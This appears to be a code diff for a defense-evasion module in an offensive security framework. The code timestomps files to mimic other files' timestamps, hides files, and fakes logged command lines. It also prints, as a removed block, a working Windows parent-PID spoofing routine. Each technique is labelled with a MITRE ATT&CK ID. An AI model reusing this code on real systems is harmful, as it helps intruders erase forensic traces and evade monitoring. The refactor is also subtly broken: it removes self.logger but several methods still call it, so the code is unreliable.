@@ -9,6 +9,7 @@ import logging
 from typing import Dict, Any, Optional, TYPE_CHECKING
 from datetime import datetime
 import stat # For file attributes
+from pathlib import Path # Used by timestomp
 
 # Imports needed for PID Spoofing
 if platform.system() == "Windows":
@@ -19,186 +20,207 @@ if platform.system() == "Windows":
     import win32process
     import pywintypes # For error handling
 
+# Import OS-specific handlers
+from .windows_defense_evasion import WindowsDefenseEvasion
+from .linux_defense_evasion import LinuxDefenseEvasion
+from .macos_defense_evasion import MacOSDefenseEvasion
+
 # Avoid circular import for type hinting
 if TYPE_CHECKING:
     from ..execution.execution import Execution
-    from .bluefire_nexus import BlueFireNexus # Added for type hint
+    # Cannot import BlueFireNexus here due to circular dependency
+    # Use string literal for type hint if needed, or alternative structure
+    # from .bluefire_nexus import BlueFireNexus
+
+logger = logging.getLogger(__name__)
 
 class DefenseEvasion:
-    """Handles defense evasion techniques like file hiding and timestomping."""
+    """Handles defense evasion techniques by dispatching to OS-specific handlers."""
 
-    def __init__(self, nexus_instance: 'BlueFireNexus', execution_module: 'Execution'):
-        self.nexus = nexus_instance
+    # Removed nexus_instance from __init__ to avoid circular import
+    # Pass execution module instead
+    def __init__(self, execution_module: 'Execution'):
+        # self.nexus = nexus_instance # Removed
         self.execution_module = execution_module
+        self.os_type = platform.system()
+        self.os_handler = None
         self.config = {
-            "default_timestomp_mode": "mimic", # mimic, specific_time, random_within_range
-            "default_timestomp_source": None, # File path to mimic times from
+            "default_timestomp_mode": "mimic",
+            "default_timestomp_source": None,
             "default_time_format": "%Y-%m-%d %H:%M:%S",
         }
-        self.logger = logging.getLogger(__name__)
+
         if not execution_module:
-            self.logger.error("DefenseEvasion module initialized WITHOUT Execution module. Some techniques may fail.")
+            logger.error("DefenseEvasion module initialized WITHOUT Execution module. Some techniques may fail.")
+            # Define a dummy _execute_command to prevent errors later?
+            def _dummy_execute(*args, **kwargs):
+                logger.error("Execution module unavailable, cannot execute commands.")
+                return {"status": "failure", "reason": "Execution module unavailable"}
+            self._execute_command = _dummy_execute
+        else:
+            # Wrapper function to ensure consistent execution call signature
+            def _execute_command_wrapper(command: str, method: str = "direct", capture: bool = True) -> Dict[str, Any]:
+                exec_data = {"execute": {"command": {"cmd": command, "method": method, "capture_output": capture}}}
+                try:
+                    exec_result = self.execution_module.execute(exec_data)
+                    # Extract the inner command execution result
+                    cmd_exec_result = exec_result.get("results", {}).get("command_execution", {})
+                    # Ensure a status is present
+                    if "status" not in cmd_exec_result:
+                         cmd_exec_result["status"] = "unknown"
+                    return cmd_exec_result
+                except Exception as e:
+                    logger.error(f"Failed to execute command '{command}' via Execution module: {e}", exc_info=True)
+                    return {"status": "failure", "reason": f"Execution failed: {e}"}
+            self._execute_command = _execute_command_wrapper
+
+        # Instantiate the appropriate OS handler
+        if self.os_type == "Windows":
+            self.os_handler = WindowsDefenseEvasion(self._execute_command)
+        elif self.os_type == "Linux":
+            self.os_handler = LinuxDefenseEvasion(self._execute_command)
+        elif self.os_type == "Darwin":
+            self.os_handler = MacOSDefenseEvasion(self._execute_command)
+        else:
+            logger.error(f"Unsupported OS for DefenseEvasion module: {self.os_type}")
+            self.os_handler = None
+
+        # Define supported techniques - combine general and OS-specific
+        self.general_techniques = {
+             "argument_spoofing": self._handle_argument_spoofing,
+             "timestomp": self._timestomp_file, # Keep timestomp general for now
+             "process_evasion": self._handle_process_evasion, # Placeholder
+             "network_evasion": self._handle_network_evasion, # Placeholder
+        }
+        self.os_supported_techniques = self.os_handler.handler_map.keys() if self.os_handler else []
+        self.supported_techniques = list(self.general_techniques.keys()) + list(self.os_supported_techniques)
+        logger.info(f"Supported defense evasion techniques on {self.os_type}: {self.supported_techniques}")
+
 
     def update_config(self, config: Dict[str, Any]):
         """Update internal config with loaded configuration."""
         self.config.update(config.get("defense_evasion", {}))
-        self.logger.info("DefenseEvasion module configuration updated.")
+        logger.info("DefenseEvasion module configuration updated.")
 
     def run_evasion(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Route defense evasion requests to appropriate handlers."""
-        result = {
-            "status": "success",
-            "timestamp": datetime.now().isoformat(),
-            "results": {}
-        }
+        result = {"status": "failure", "reason": "No technique specified"}
         errors = []
+        results_map = {}
 
-        evasion_requests = data.get("evade", {}) # e.g., {"technique": "file_evasion", "details": {...}}
+        evasion_requests = data.get("evade", {}) # Allow single or list? Assume single for now
         technique = evasion_requests.get("technique")
         details = evasion_requests.get("details", {})
 
         if not technique:
             return {"status": "error", "message": "Missing 'technique' in evasion request data."}
 
-        handler_map = {
-            "file_evasion": self._handle_file_evasion,
-            "pid_spoofing": self._handle_pid_spoofing,
-            "argument_spoofing": self._handle_argument_spoofing,
-            "process_evasion": self._handle_process_evasion,
-            "network_evasion": self._handle_network_evasion,
-        }
+        handler = None
+        is_os_specific = False
 
-        handler = handler_map.get(technique)
-
-        if handler:
-            try:
-                evasion_result = handler(details)
-                result["results"][technique] = evasion_result
-                if evasion_result.get("status") == "failure":
-                    result["status"] = "partial_success"
-                    errors.append(f"Technique '{technique}' failed: {evasion_result.get('details', {}).get('error', 'Unknown reason')}")
-            except Exception as e:
-                error_msg = f"Evasion technique '{technique}' failed: {e}"
-                errors.append(error_msg)
-                self._log_error(error_msg, exc_info=True)
-                result["results"][technique] = {"status": "error", "message": str(e)}
+        # Check general handlers first
+        if technique in self.general_techniques:
+            handler = self.general_techniques[technique]
+        # Check OS-specific handlers if available
+        elif self.os_handler and technique in self.os_handler.handler_map:
+            handler = self.os_handler.evade # Call the dispatch method
+            is_os_specific = True
+        # Handle sub-techniques like file_evasion actions
+        elif technique == "file_evasion":
+             action = details.get("action")
+             if action == "hide" and self.os_handler and "file_hide" in self.os_handler.handler_map:
+                 handler = self.os_handler.evade
+                 technique = "file_hide" # Adjust technique for OS handler dispatch
+                 is_os_specific = True
+             elif action == "timestomp":
+                 # Timestomp currently handled by general handler
+                 handler = self._timestomp_file
+                 technique = "timestomp" # Adjust technique name
+             else:
+                  error_msg = f"Unsupported file evasion action '{action}' or OS handler unavailable."
+                  errors.append(error_msg)
+                  results_map[technique] = {"status": "error", "message": error_msg}
         else:
             error_msg = f"Unsupported or unknown evasion technique requested: {technique}"
             errors.append(error_msg)
-            self._log_error(error_msg)
-            result["results"][technique] = {"status": "error", "message": error_msg}
+            results_map[technique] = {"status": "error", "message": error_msg}
 
+        if handler:
+            try:
+                if is_os_specific:
+                    # OS handler's evade method expects technique name
+                    evasion_result = handler(technique, details)
+                else:
+                    # General handlers directly process details
+                    evasion_result = handler(details)
+                
+                results_map[technique] = evasion_result # Store result under the (potentially adjusted) technique name
+                if evasion_result.get("status") == "failure":
+                    errors.append(f"Technique '{technique}' failed: {evasion_result.get('reason', 'Unknown reason')}")
+            except Exception as e:
+                error_msg = f"Evasion technique '{technique}' execution failed: {e}"
+                errors.append(error_msg)
+                logger.error(error_msg, exc_info=True)
+                results_map[technique] = {"status": "error", "reason": str(e)}
+
+        # Determine overall status
+        final_status = "success"
         if errors:
-            result["status"] = "failure" if not result["results"] or all(v.get("status") == "error" for v in result["results"].values()) else "partial_success"
-            result["errors"] = errors
+            all_failed = all(res.get("status") != "success" for res in results_map.values())
+            final_status = "failure" if all_failed else "partial_success"
+        elif not results_map: # No handler found or ran
+             final_status = "failure"
+             errors.append("No technique executed.")
 
-        return result
-        
-    def _execute_command(self, command: str, method: str = "direct", capture: bool = True) -> Dict[str, Any]:
-        """Helper to execute commands via the Execution module."""
-        if not self.execution_module:
-             self.logger.error("Execution module not available for DefenseEvasion.")
-             return {"status": "error", "message": "Execution module unavailable"}
-             
-        exec_data = {"execute": {"command": {"cmd": command, "method": method, "capture_output": capture}}}
-        try:
-            exec_result = self.execution_module.execute(exec_data)
-            return exec_result.get("results", {}).get("command_execution", {"status": "error", "message": "Execution result format unexpected"})
-        except Exception as e:
-            self.logger.error(f"Failed to execute command '{command}' via Execution module: {e}", exc_info=True)
-            return {"status": "error", "message": f"Execution failed: {e}"}
+        return {
+            "status": final_status,
+            "timestamp": datetime.now().isoformat(),
+            "results": results_map,
+            "errors": errors if errors else None
+        }
+
+
+    # --- General Handlers (Cross-Platform or Dispatchers) ---
 
     def _handle_file_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Handle file evasion techniques like hiding and timestomping."""
+        """Handle file evasion techniques like hiding and timestomping - Now dispatches."""
         target_file = details.get("target_file")
         action = details.get("action", "hide") # hide, timestomp
 
         if not target_file or not os.path.exists(target_file):
-             return {"status": "error", "message": f"Target file '{target_file}' not provided or does not exist."}
+             return {"status": "error", "reason": f"Target file '{target_file}' not provided or does not exist."}
 
-        self.logger.info(f"Attempting file evasion action '{action}' on target: {target_file}")
-        
+        self.logger.info(f"Handling file evasion action '{action}' on target: {target_file}")
+
         if action == "hide":
-             return self._hide_file(target_file, details)
-        elif action == "timestomp":
-             return self._timestomp_file(target_file, details)
-        else:
-            return {"status": "error", "message": f"Unsupported file evasion action: {action}"}
-
-    def _hide_file(self, target_file: str, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Hide a file using OS-specific methods."""
-        os_type = platform.system()
-        result_details = {"target_file": target_file}
-        status = "failure" # Default to failure
-        mitre_id = "T1564.001" # Hidden Files and Directories
-        mitre_name = "Hide Artifacts: Hidden Files and Directories"
-
-        try:
-            if os_type == "Windows":
-                self.logger.info(f"Attempting to hide file (Windows): {target_file}")
-                cmd = f'attrib +h \"{target_file}\"' # Use quotes for paths with spaces
-                exec_result = self._execute_command(cmd, method="cmd")
-                result_details["command_executed"] = cmd
-                result_details["execution_stdout"] = exec_result.get("details", {}).get("stdout")
-                result_details["execution_stderr"] = exec_result.get("details", {}).get("stderr")
-                result_details["execution_return_code"] = exec_result.get("details", {}).get("return_code")
-
-                if exec_result.get("status") == "success" and exec_result.get("details", {}).get("return_code") == 0:
-                    status = "success"
-                    self.logger.info(f"Successfully hid file using attrib: {target_file}")
-                else:
-                    result_details["error"] = exec_result.get("details", {}).get("stderr") or exec_result.get("message", "Execution failed")
-                    self.logger.error(f"Failed to hide file using attrib: {target_file}. Error: {result_details['error']}")
-
-            elif os_type in ["Linux", "Darwin"]:
-                self.logger.info(f"Attempting to hide file (Unix-like): {target_file}")
-                file_path = Path(target_file)
-                if file_path.name.startswith('.'):
-                     status = "skipped"
-                     result_details["message"] = "File already appears hidden (starts with dot)."
-                     self.logger.warning(result_details["message"])
-                else:
-                    hidden_path = file_path.parent / ('.' + file_path.name)
-                    try:
-                        os.rename(target_file, hidden_path)
-                        status = "success"
-                        result_details["new_path"] = str(hidden_path)
-                        self.logger.info(f"Successfully hid file by renaming to: {hidden_path}")
-                    except OSError as e:
-                        result_details["error"] = f"Failed to rename file for hiding: {e}"
-                        self.logger.error(result_details["error"], exc_info=True)
+            if self.os_handler and "file_hide" in self.os_handler.handler_map:
+                return self.os_handler.evade("file_hide", details)
             else:
-                status = "skipped"
-                result_details["error"] = f"File hiding not implemented for OS type: {os_type}"
-                self.logger.warning(result_details["error"])
-        
-        except Exception as e:
-            result_details["error"] = f"Unexpected error during file hiding: {e}"
-            self.logger.error(result_details["error"], exc_info=True)
-            status = "error"
+                return {"status": "not_implemented", "reason": f"File hiding not supported on {self.os_type}"}
+        elif action == "timestomp":
+            # Timestomp logic is relatively cross-platform, keep here for now
+            return self._timestomp_file(details)
+        else:
+            return {"status": "error", "reason": f"Unsupported file evasion action: {action}"}
 
-        return {
-            "status": status,
-            "technique": "file_hide",
-            "mitre_technique_id": mitre_id,
-            "mitre_technique_name": mitre_name,
-            "timestamp": datetime.now().isoformat(),
-            "details": result_details
-        }
-        
-    def _timestomp_file(self, target_file: str, details: Dict[str, Any]) -> Dict[str, Any]:
+
+    def _timestomp_file(self, details: Dict[str, Any]) -> Dict[str, Any]:
         """Modify file access, modification, and creation times."""
+        target_file = details.get("target_file")
+        if not target_file or not os.path.exists(target_file):
+             return {"status": "error", "reason": f"Target file '{target_file}' not provided or does not exist."}
+             
         mode = details.get("mode", self.config.get("default_timestomp_mode", "mimic"))
         source_file = details.get("source_file", self.config.get("default_timestomp_source"))
         access_time_str = details.get("access_time")
         modify_time_str = details.get("modify_time")
         time_format = self.config.get("default_time_format")
-        
+
         result_details = {"target_file": target_file, "mode": mode}
         status = "failure"
-        mitre_id = "T1070.006" # Indicator Removal: Timestomp
+        mitre_id = "T1070.006"
         mitre_name = "Indicator Removal: Timestomp"
-        
+
         access_time_ts = None
         modify_time_ts = None
 
@@ -207,344 +229,169 @@ class DefenseEvasion:
         try:
             if mode == "mimic":
                 if not source_file or not os.path.exists(source_file):
-                     result_details["error"] = f"Source file '{source_file}' for mimic mode not provided or does not exist."
-                     self.logger.error(result_details["error"])
-                     return {"status": "error", "message": result_details["error"], "details": result_details}
-                
+                     reason = f"Source file '{source_file}' for mimic mode not provided or does not exist."
+                     result_details["reason"] = reason
+                     self.logger.error(reason)
+                     return {"status": "error", "reason": reason, "details": result_details, "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}
+
                 result_details["source_file"] = source_file
                 stat_result = os.stat(source_file)
                 access_time_ts = stat_result.st_atime
                 modify_time_ts = stat_result.st_mtime
                 self.logger.info(f"Mimicking timestamps from {source_file}: AT={access_time_ts}, MT={modify_time_ts}")
-            
+
             elif mode == "specific_time":
                 try:
+                    current_stat = os.stat(target_file)
+                    # Use current times as default if specific ones aren't provided
+                    access_time_ts = current_stat.st_atime
+                    modify_time_ts = current_stat.st_mtime
+
                     if access_time_str:
                         access_time_dt = datetime.strptime(access_time_str, time_format)
                         access_time_ts = access_time_dt.timestamp()
                     if modify_time_str:
                         modify_time_dt = datetime.strptime(modify_time_str, time_format)
                         modify_time_ts = modify_time_dt.timestamp()
-                    
-                    if not access_time_ts and not modify_time_ts:
-                         raise ValueError("Neither access_time nor modify_time provided for specific_time mode.")
-                         
-                    # Use current time if one is missing?
-                    if not access_time_ts: access_time_ts = os.stat(target_file).st_atime
-                    if not modify_time_ts: modify_time_ts = os.stat(target_file).st_mtime
+
+                    if not access_time_str and not modify_time_str:
+                         self.logger.warning("Neither access_time nor modify_time provided for specific_time mode. Using current times.")
+
                     self.logger.info(f"Using specific timestamps: AT={access_time_ts}, MT={modify_time_ts}")
-                    
+
                 except ValueError as e:
-                     result_details["error"] = f"Invalid time format or missing time for specific_time mode: {e}. Expected format: {time_format}"
-                     self.logger.error(result_details["error"])
-                     return {"status": "error", "message": result_details["error"], "details": result_details}
-            
+                     reason = f"Invalid time format for specific_time mode: {e}. Expected format: {time_format}"
+                     result_details["reason"] = reason
+                     self.logger.error(reason)
+                     return {"status": "error", "reason": reason, "details": result_details, "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}
+
             # Add "random_within_range" mode later if needed
-            
+
             else:
-                 result_details["error"] = f"Unsupported timestomp mode: {mode}"
-                 self.logger.error(result_details["error"])
-                 return {"status": "error", "message": result_details["error"], "details": result_details}
+                 reason = f"Unsupported timestomp mode: {mode}"
+                 result_details["reason"] = reason
+                 self.logger.error(reason)
+                 return {"status": "error", "reason": reason, "details": result_details, "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}
 
             # Apply the timestamps using os.utime
             if access_time_ts is not None and modify_time_ts is not None:
-                os.utime(target_file, (access_time_ts, modify_time_ts))
-                status = "success"
-                result_details["applied_access_time"] = datetime.fromtimestamp(access_time_ts).strftime(time_format)
-                result_details["applied_modify_time"] = datetime.fromtimestamp(modify_time_ts).strftime(time_format)
-                # Note: Creation time (st_birthtime) is harder to modify portably, often requires platform-specific APIs.
-                self.logger.info(f"Successfully applied timestamps to {target_file}")
+                 os.utime(target_file, (access_time_ts, modify_time_ts))
+                 # Verification (optional)
+                 new_stat = os.stat(target_file)
+                 if abs(new_stat.st_atime - access_time_ts) < 1 and abs(new_stat.st_mtime - modify_time_ts) < 1:
+                      status = "success"
+                      result_details["applied_access_time"] = access_time_ts
+                      result_details["applied_modify_time"] = modify_time_ts
+                      self.logger.info(f"Successfully timestomped {target_file}.")
+                 else:
+                      reason = "os.utime completed but verification of timestamps failed."
+                      result_details["reason"] = reason
+                      self.logger.error(reason)
             else:
-                 # This case should ideally be caught by the mode logic above
-                 result_details["error"] = "Failed to determine timestamps to apply."
-                 self.logger.error(result_details["error"])
-                 
-        except OSError as e:
-            result_details["error"] = f"Failed to apply timestamps: {e}"
-            self.logger.error(result_details["error"], exc_info=True)
+                 reason = "Could not determine timestamps to apply."
+                 result_details["reason"] = reason
+                 self.logger.error(reason)
+
         except Exception as e:
-            result_details["error"] = f"Unexpected error during timestomping: {e}"
-            self.logger.error(result_details["error"], exc_info=True)
+            reason = f"Unexpected error during timestomp: {e}"
+            result_details["reason"] = reason
+            self.logger.error(reason, exc_info=True)
             status = "error"
 
         return {
             "status": status,
-            "technique": "timestomp",
+            "technique": "timestomp", # Keep specific technique name
             "mitre_technique_id": mitre_id,
             "mitre_technique_name": mitre_name,
-            "timestamp": datetime.now().isoformat(),
-            "details": result_details
-        }
-        
-    def _handle_pid_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Perform Parent PID Spoofing using CreateProcess and UpdateProcThreadAttribute."""
-        result_details = {}
-        status = "failure"
-        mitre_id = "T1134.004" # Access Token Manipulation: Parent PID Spoofing
-        mitre_name = "Access Token Manipulation: Parent PID Spoofing"
-        created_pid = None
-
-        if platform.system() != "Windows":
-            return {"status": "skipped", "message": "PID Spoofing via UpdateProcThreadAttribute is only supported on Windows."}
-
-        parent_pid = details.get("parent_pid")
-        command_to_run = details.get("command_to_run")
-        create_suspended = details.get("create_suspended", False) # Option to create suspended
-
-        result_details["target_parent_pid"] = parent_pid
-        result_details["command_to_run"] = command_to_run
-
-        if not parent_pid or not command_to_run:
-            result_details["error"] = "Missing required parameters: parent_pid and command_to_run"
-            self.logger.error(result_details["error"])
-            return {"status": "error", "message": result_details["error"], "details": result_details}
-
-        self.logger.info(f"Attempting PID Spoofing: Create '{command_to_run}' as child of PID {parent_pid}")
-
-        # Define necessary structures and constants
-        lpAttributeList = None
-        hParentProcess = None
-        try:
-            # Constants
-            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
-            CREATE_SUSPENDED = 0x00000004
-            
-            # Structures
-            class STARTUPINFOEX(ctypes.Structure):
-                _fields_ = [
-                    ("StartupInfo", win32process.STARTUPINFO),
-                    ("lpAttributeList", wintypes.LPVOID)
-                ]
-
-            # Get handle to parent process
-            hParentProcess = win32api.OpenProcess(win32con.PROCESS_CREATE_PROCESS, False, int(parent_pid))
-            if not hParentProcess:
-                 raise ctypes.WinError(ctypes.get_last_error())
-                 
-            result_details["parent_process_handle"] = f"{hParentProcess.handle:#0x}"
-
-            # Initialize STARTUPINFOEX
-            siEx = STARTUPINFOEX()
-            siEx.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
-            # siEx.StartupInfo.dwFlags = win32con.STARTF_USESHOWWINDOW # Optional flags
-            # siEx.StartupInfo.wShowWindow = win32con.SW_HIDE # Optional flags
-
-            # Determine size needed for attribute list
-            size = wintypes.SIZE_T()
-            win32process.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
-            if size.value == 0:
-                 raise RuntimeError("InitializeProcThreadAttributeList failed to return size.")
-
-            # Allocate memory for the attribute list
-            lpAttributeList = ctypes.create_string_buffer(size.value)
-            siEx.lpAttributeList = ctypes.cast(lpAttributeList, wintypes.LPVOID)
-
-            # Initialize the attribute list
-            if not win32process.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ctypes.byref(size)):
-                 raise ctypes.WinError(ctypes.get_last_error())
-
-            # Update the attribute list with the parent process
-            lpValue = wintypes.HANDLE(hParentProcess.handle)
-            if not win32process.UpdateProcThreadAttribute(
-                lpAttributeList, 
-                0, 
-                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
-                ctypes.byref(lpValue), 
-                ctypes.sizeof(lpValue), 
-                None, 
-                None
-            ):
-                 raise ctypes.WinError(ctypes.get_last_error())
-
-            # Create process
-            creation_flags = EXTENDED_STARTUPINFO_PRESENT
-            if create_suspended:
-                creation_flags |= CREATE_SUSPENDED
-                
-            self.logger.debug(f"Calling CreateProcess with parent PID {parent_pid}...")
-            (hProcess, hThread, dwProcessId, dwThreadId) = win32process.CreateProcess(
-                None,                         # AppName (use None for command line)
-                command_to_run,               # Command Line
-                None,                         # Process Attributes
-                None,                         # Thread Attributes
-                False,                        # Inherit Handles
-                creation_flags,               # Creation Flags
-                None,                         # Environment
-                None,                         # Current Directory
-                siEx.StartupInfo              # STARTUPINFO (embedded in STARTUPINFOEX)
-            )
-            
-            created_pid = dwProcessId
-            result_details["created_process_id"] = created_pid
-            result_details["created_thread_id"] = dwThreadId
-            result_details["process_handle"] = f"{hProcess.handle:#0x}"
-            result_details["thread_handle"] = f"{hThread.handle:#0x}"
-            status = "success"
-            self.logger.info(f"Successfully created process '{command_to_run}' (PID: {created_pid}) with parent PID {parent_pid}")
-
-            # Close handles for the new process
-            win32api.CloseHandle(hProcess)
-            win32api.CloseHandle(hThread)
-
-        except (pywintypes.error, OSError, RuntimeError, Exception) as e:
-            error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
-            error_msg = getattr(e, 'strerror', str(e))
-            result_details["error"] = f"PID Spoofing failed: {error_msg} (Code: {error_code})"
-            self.logger.error(result_details["error"], exc_info=True)
-            status = "error"
-        finally:
-            # Clean up attribute list and parent process handle
-            if lpAttributeList:
-                win32process.DeleteProcThreadAttributeList(lpAttributeList)
-            if hParentProcess:
-                win32api.CloseHandle(hParentProcess)
-
-        return {
-            "status": status,
-            "technique": "pid_spoofing",
-            "mitre_technique_id": mitre_id,
-            "mitre_technique_name": mitre_name,
-            "timestamp": datetime.now().isoformat(),
             "details": result_details
         }
 
     def _handle_argument_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Perform Command-Line Argument Spoofing/Obfuscation."""
+        """Simulate Argument Spoofing by manipulating command line before execution."""
+        original_command = details.get("command")
+        spoofed_command = details.get("spoofed_command") # How the command should appear in logs
+        execution_method = details.get("execution_method", "direct") # How to actually run
+        mitre_id = "T1564.009" # System Hiding: Argument Spoofing
+        mitre_name = "Hide Artifacts: Argument Spoofing"
         result_details = {}
-        status = "failure"
-        mitre_id = "T1564.009" # Hide Artifacts: Process Argument Spoofing (approximation)
-        mitre_name = "Hide Artifacts: Process Argument Spoofing"
+
+        if not original_command or not spoofed_command:
+            return {"status": "error", "reason": "Missing 'command' or 'spoofed_command' in details.", "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}
+
+        self.logger.info(f"Attempting Argument Spoofing: Spoofed='{spoofed_command}', Actual='{original_command}'")
+        result_details["original_command"] = original_command
+        result_details["spoofed_command_logged"] = spoofed_command # Log what it *should* look like
+        result_details["actual_command_executed"] = original_command
+
+        # --- Simulation Logic ---
+        # In a real scenario, this would involve complex process manipulation (e.g., modifying PEB).
+        # Here, we simulate by: 
+        # 1. Executing the *original* command.
+        # 2. Returning a result that *claims* the spoofed command was run.
+        self.logger.warning("Argument Spoofing is SIMULATED. Executing the original command but logging the spoofed one.")
         
-        command_to_run = details.get("command_to_run") # e.g., "powershell.exe -ExecutionPolicy Bypass -File script.ps1"
-        spoofed_command_line = details.get("spoofed_command_line") # e.g., "powershell.exe -Command Get-Date"
-
-        result_details["original_command"] = command_to_run
-        result_details["spoofed_command_line_provided"] = spoofed_command_line
-
-        if not command_to_run:
-            result_details["error"] = "Missing required parameter: command_to_run"
-            self.logger.error(result_details["error"])
-            return {"status": "error", "message": result_details["error"], "details": result_details}
-
-        # If no specific spoofed line is provided, create a basic misleading one
-        if not spoofed_command_line:
-            executable = command_to_run.split(" ", 1)[0]
-            spoofed_command_line = f'{executable} --legitimate-looking-option'
-            result_details["spoofed_command_line_generated"] = spoofed_command_line
+        try:
+            # Execute the *actual* command using the chosen method
+            exec_result = self._execute_command(original_command, method=execution_method, capture=True)
             
-        self.logger.info(f"Attempting Argument Spoofing: Run '{command_to_run}' appearing as '{spoofed_command_line}'")
+            result_details["execution_result"] = exec_result # Include actual execution details for debugging/info
+            
+            # Report success/failure based on the *actual* execution
+            status = exec_result.get("status", "failure")
+            if status != "success":
+                 result_details["reason"] = exec_result.get("reason", "Actual command execution failed.")
+                 self.logger.error(f"Argument Spoofing simulation failed because underlying command failed: {result_details['reason']}")
+            else:
+                 self.logger.info("Argument Spoofing simulation completed (actual command ran successfully). Logging spoofed command.")
 
-        # --- Implementation --- 
-        # Basic Method (Windows): Pass the real command in lpApplicationName 
-        # and the spoofed command in lpCommandLine to CreateProcess.
-        # Note: This specific technique relies on how different monitoring tools 
-        # capture command lines (some might capture only lpCommandLine).
-        # More advanced PEB manipulation is possible but complex.
-        
-        if platform.system() != "Windows":
-            status = "skipped"
-            result_details["message"] = "Basic argument spoofing via CreateProcess parameters is Windows-specific."
-            self.logger.warning(result_details["message"])
-        else:
-            try:
-                # Ensure the executable path is correctly extracted if command_to_run includes arguments
-                executable_path = command_to_run.split(" ", 1)[0]
-                # We pass the REAL command/args via lpCommandLine, and the SPOOFED one is more conceptual
-                # for this basic simulation or would require PEB manipulation not implemented here.
-                # A simpler approach for simulation is to just execute the real command 
-                # and log that it *appeared* as the spoofed one.
-                
-                # Let's use the execution module for now, but note its limitation
-                # The execution module might not directly support splitting app/cmdline easily
-                # for CreateProcess like needed for *true* argument spoofing vis-a-vis monitoring tools.
-                # We simulate the *intent* here.
-                
-                self.logger.warning("Simulating argument spoofing: Executing real command, logging spoofed appearance.")
-                exec_result = self._execute_command(command_to_run, method="direct", capture=True)
-                
-                result_details["command_executed"] = command_to_run
-                result_details["appeared_as"] = spoofed_command_line
-                result_details["execution_stdout"] = exec_result.get("details", {}).get("stdout")
-                result_details["execution_stderr"] = exec_result.get("details", {}).get("stderr")
-                result_details["execution_return_code"] = exec_result.get("details", {}).get("return_code")
-
-                if exec_result.get("status") == "success":
-                    status = "success"
-                    created_pid = exec_result.get("details", {}).get("pid") # Assuming execution module provides PID
-                    result_details["created_process_id"] = created_pid
-                    self.logger.info(f"Successfully executed command (PID: {created_pid}) while simulating argument spoofing.")
-                else:
-                    result_details["error"] = exec_result.get("message", "Execution failed")
-                    self.logger.error(f"Execution failed during argument spoofing simulation: {result_details['error']}")
-
-            except Exception as e:
-                result_details["error"] = f"Argument Spoofing simulation failed: {e}"
-                self.logger.error(result_details["error"], exc_info=True)
-                status = "error"
+        except Exception as e:
+            reason = f"Unexpected error during argument spoofing simulation: {e}"
+            result_details["reason"] = reason
+            self.logger.error(reason, exc_info=True)
+            status = "error"
 
         return {
-            "status": status,
+            "status": status, # Reflects success/failure of *actual* command
             "technique": "argument_spoofing",
             "mitre_technique_id": mitre_id,
             "mitre_technique_name": mitre_name,
-            "timestamp": datetime.now().isoformat(),
+            "simulation_note": "Executed original command, logged spoofed command.",
             "details": result_details
         }
 
+    # --- OS-Specific Dispatchers (Examples) ---
+
+    def _handle_pid_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Dispatch PID Spoofing to the OS-specific handler."""
+        if self.os_handler and "pid_spoofing" in self.os_handler.handler_map:
+             return self.os_handler.evade("pid_spoofing", details)
+        else:
+             logger.warning(f"PID Spoofing is not supported on {self.os_type}.")
+             return {"status": "not_implemented", "reason": f"PID Spoofing not supported on {self.os_type}", "technique": "pid_spoofing"}
+             
+    # --- Placeholder Handlers ---
+
     def _handle_process_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Placeholder handler for general process evasion techniques."""
-        # This function would ideally dispatch to more specific handlers 
-        # like _handle_pid_spoofing, _handle_argument_spoofing, _handle_process_hollowing etc.
-        # based on a more detailed 'sub_technique' key within details.
-        sub_technique = details.get("sub_technique", "generic_process_evasion")
-        self.logger.warning(f"Process Evasion technique '{sub_technique}' is not specifically implemented. Returning skipped status.")
-        return {
-            "status": "skipped", 
-            "message": f"General process evasion technique '{sub_technique}' not implemented.",
-            "technique": "process_evasion",
-            "sub_technique": sub_technique,
-            "timestamp": datetime.now().isoformat(),
-            "details": details
-        }
+        """Placeholder for generic process evasion techniques (e.g., hollowing)."""
+        self.logger.warning("Process Evasion technique is not implemented.")
+        return {"status": "not_implemented", "reason": "Process Evasion handler not implemented", "technique": "process_evasion"}
 
     def _handle_network_evasion(self, details: Dict[str, Any]) -> Dict[str, Any]:
-        """Placeholder handler for general network evasion techniques."""
-        # This could dispatch to traffic obfuscation, protocol manipulation etc.
-        sub_technique = details.get("sub_technique", "generic_network_evasion")
-        self.logger.warning(f"Network Evasion technique '{sub_technique}' is not implemented. Returning skipped status.")
-        return {
-            "status": "skipped", 
-            "message": f"General network evasion technique '{sub_technique}' not implemented.",
-            "technique": "network_evasion",
-            "sub_technique": sub_technique,
-            "timestamp": datetime.now().isoformat(),
-            "details": details
-        }
-
-    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
-         """Placeholder for techniques not yet realistically implemented."""
-         import inspect
-         technique_name = "unknown"
-         try:
-              caller_frame = inspect.currentframe().f_back
-              if caller_frame:
-                  technique_name = caller_frame.f_code.co_name.replace("_handle_", "")
-         except Exception:
-              pass
-              
-         self.logger.warning(f"Defense Evasion technique '{technique_name}' is not yet implemented.")
-         return {
-             "status": "skipped", 
-             "message": f"Technique '{technique_name}' not implemented.",
-             "technique": technique_name,
-             "timestamp": datetime.now().isoformat(),
-             "details": details
-         }
+        """Placeholder for generic network evasion techniques (e.g., traffic manipulation)."""
+        self.logger.warning("Network Evasion technique is not implemented.")
+        return {"status": "not_implemented", "reason": "Network Evasion handler not implemented", "technique": "network_evasion"}
 
     def _log_error(self, message: str, exc_info=False) -> None:
         """Log errors using the initialized logger."""
